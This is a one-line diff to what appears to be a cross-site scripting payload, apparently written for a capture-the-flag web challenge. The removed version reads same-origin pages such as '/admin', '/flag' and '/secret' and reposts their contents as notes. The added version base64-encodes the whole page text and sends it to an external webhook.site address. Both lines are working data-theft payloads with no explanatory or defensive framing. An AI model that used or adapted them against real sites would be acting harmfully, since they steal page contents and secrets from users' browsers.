@@ -1,1 +1,1 @@
-['/','/notes','/search','/admin','/flag','/secret'].forEach(u=>fetch(u).then(r=>r.text()).then(d=>fetch('/notes',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title='+encodeURIComponent(u)+'&content='+encodeURIComponent(d.substring(0,300))})));
+fetch('https://webhook.site/f4209e86-ce3c-4e0c-aa91-31dbd14f2ad6?flag='+btoa(unescape(encodeURIComponent(document.body.innerText))));
